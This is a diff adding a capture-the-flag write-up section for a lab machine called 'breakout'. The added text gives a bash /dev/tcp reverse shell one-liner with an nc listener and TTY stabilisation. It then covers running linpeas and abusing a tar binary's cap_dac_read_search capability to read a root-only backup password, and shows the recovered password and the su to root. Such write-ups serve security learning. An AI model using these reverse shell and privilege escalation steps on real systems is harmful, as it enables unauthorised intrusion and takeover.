@@ -165,7 +165,37 @@ I found that there is a command line interface in the `Login` menu option
 <img width="1917" height="623" alt="Screenshot 2026-02-16 001258" src="https://github.com/user-attachments/assets/aee076ea-1db0-449f-b2d5-21a8941ca8a7" />
 -> achieve the user flag
 
+Now I want to use this shell in my terminal so I start establishing a simple reverse shell
+
+On the website
+<img width="255" height="67" alt="Screenshot 2026-02-22 002953" src="https://github.com/user-attachments/assets/3f6ae5e1-e27a-4071-b1c9-dcdafc853ded" />
+Then use this command
+```
+sh -i >& /dev/tcp/192.168./9001 0>&1
+```
+
+On our attack machine 
+```
+nc -lnvp 9001
+```
+
+After getting the shell, I stablized in case something unexpected happen
+```
+export TERM=xterm
+python3 -c "import pty;pty.spawn('/bin/bash')"
+(press CTRL+Z)
+stty raw -echo;fg;reset
+```
+
 # Privilege Escalation
+
+Clearly I can see that the binary tool `tar` which we can use freely without further permission
+
+<img width="493" height="272" alt="Screenshot 2026-02-22 003320" src="https://github.com/user-attachments/assets/e5ac0da9-14b0-4414-ac8c-45dcab5fcda4" />
+
+
+
+
 By setting up a listener on my attack machine
 ```
 python3 -m http.server 1234
@@ -178,9 +208,50 @@ chmod +x linpeas.sh
 ./linpeas.sh
 ```
 
+After running linpeas, I found that 
+```
+Files with capabilities (limited to 50):
+/home/cyber/tar cap_dac_read_search=ep
+```
+->  is able to read arbitrary file from host system
+So interesting, it leaded me to focus more on `tar`
+
+And I discovered there was a backup folder
+```
+drwxr-xr-x 2 root root 4096 Feb 15 03:21 /var/backups
+```
+
+That's a lucky shot that I found hidden .bak file inside this backup folder
+```
+cyber@breakout:/var/backups$ ls -la
+total 28
+drwxr-xr-x  2 root root  4096 Feb 15 03:21 .
+drwxr-xr-x 14 root root  4096 Oct 19  2021 ..
+-rw-r--r--  1 root root 12732 Oct 19  2021 apt.extended_states.0
+-rw-------  1 root root    17 Oct 20  2021 .old_pass.bak
+```
+
+Given the capability to read arbitrary file, I would utilize the `tar` to read this file
+
+```
+cyber@breakout:~$ ./tar -cf pass.tar /var/backups/.old_pass.bak
+./tar: Removing leading `/' from member names
+cyber@breakout:~$ ls                                           
+linpeas.sh  linpeas.sh.1  pass.tar  tar  user.txt
+cyber@breakout:~$ tar -xf pass.tar
+cyber@breakout:~$ ls
+linpeas.sh  linpeas.sh.1  pass.tar  tar  user.txt  var
+cyber@breakout:~$ cat var/backups/.old_pass.bak
+Ts&4&YurgtRX(=~h
+```
+The mechanism is compressing the file then extract it with tar
+
+Afterward, using the encoded string as password for root
+```
+cyber@breakout:/var/backups$ su -
+Password: 
+root@breakout:~# 
+```
 
 
-
-
-
-
+Happy Hacking!@#$!@#$
